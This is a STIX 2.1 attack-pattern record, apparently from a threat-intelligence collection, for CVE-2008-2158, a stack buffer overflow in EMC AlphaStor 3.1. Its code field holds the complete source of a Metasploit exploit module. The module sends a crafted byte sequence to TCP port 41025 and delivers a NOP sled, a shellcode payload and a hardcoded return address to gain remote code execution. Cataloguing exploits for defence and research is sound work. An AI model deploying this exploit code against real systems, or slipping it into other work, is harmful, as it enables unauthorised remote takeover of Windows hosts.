{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e7a285a3-dc65-4a21-a0ad-0bbe28e8998c",
    "created": "2024-08-14T16:48:07.34377Z",
    "modified": "2024-08-14T16:48:07.343774Z",
    "name": "EMC AlphaStor Agent Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in EMC AlphaStor 3.1. By sending a specially crafted message, an attacker may be able to execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/emc/alphastor_agent.rb",
            "external_id": "alphastor_agent.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-2158"
        },
        {
            "source_name": "reference",
            "url": "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=702"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'EMC AlphaStor Agent Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in EMC AlphaStor 3.1.\n        By sending a specially crafted message, an attacker may\n        be able to execute arbitrary code.\n      },\n      'Author'         => 'MC',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2008-2158' ],\n          [ 'OSVDB', '45714' ],\n          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=702' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process', # one-shot overwrite.\n        },\n      'Payload'        =>\n        {\n          'Space'    => 750,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x20\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'EMC AlphaStor 3.1', { 'Ret' => 0x65153fe0 } ], # dblib9.dll 9.0.1.1975\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2008-05-27',\n      'DefaultTarget' => 0))\n\n    register_options([Opt::RPORT(41025)])\n  end\n\n  def exploit\n    connect\n\n    # overwrite via: ascli.exe asopmsg \"long_buff\"\n    uno = [0x0000000b].pack('V')\n    sock.put(uno)\n\n    dos =  rand_text_alpha_upper(3) + \"@\" + rand_text_alpha_upper(6) + \"\\x00\"\n    sock.put(dos)\n\n    tres = [0x00000004].pack('V')\n    sock.put(tres)\n\n    quatro = [0x0000001b].pack('V')\n    sock.put(quatro)\n\n    cinco = [0x0000047c].pack('V')\n    sock.put(cinco)\n\n    data =  make_nops(827 - payload.encoded.length) + payload.encoded\n    data << make_nops(2) + Rex::Arch::X86.jmp_short(6) + [target.ret].pack('V')\n    data << make_nops(8) + [0xe8, -750].pack('CV') + rand_text_alpha_upper(500) + \"\\x00\"\n\n    print_status(\"Trying target #{target.name}...\")\n    sock.put(data)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-05-27",
    "x_mitre_platforms": [
        "win'"
    ]
}